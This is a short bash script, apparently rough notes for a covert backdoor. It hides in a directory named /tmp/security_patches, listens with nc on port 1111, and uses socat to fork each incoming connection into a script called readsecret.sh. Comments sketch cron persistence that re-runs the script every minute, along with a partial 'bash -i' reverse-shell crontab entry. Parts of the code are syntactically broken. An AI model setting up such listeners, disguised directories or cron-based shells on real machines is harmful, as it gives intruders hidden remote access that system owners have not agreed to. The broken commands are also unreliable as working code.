#! /bin/bash

mkdir /tmp/security_patches > /dev/null
cd /tmp/security_patches

# This is all after I go ahead and install nc with 'yum install nc'

nc -l 1111 # maybe -ul if udp
# This socat makes a tcp connection but also I think i can just nc like nc -l 1111 | ./readsecret.sh
socat -u tcp-l: 1111, fork system: ./readsecret.sh



# (crontab -l ; echo "* * * * * bash -i &> " ) >> crontab -

# How to use this script, 
# This is all after I go ahead and install nc with 'yum install nc' and download socat
# chmod +x /tmp/security_patches/script.sh
# We can add this script to the crontab by appending * * * * * /dir/this_script 
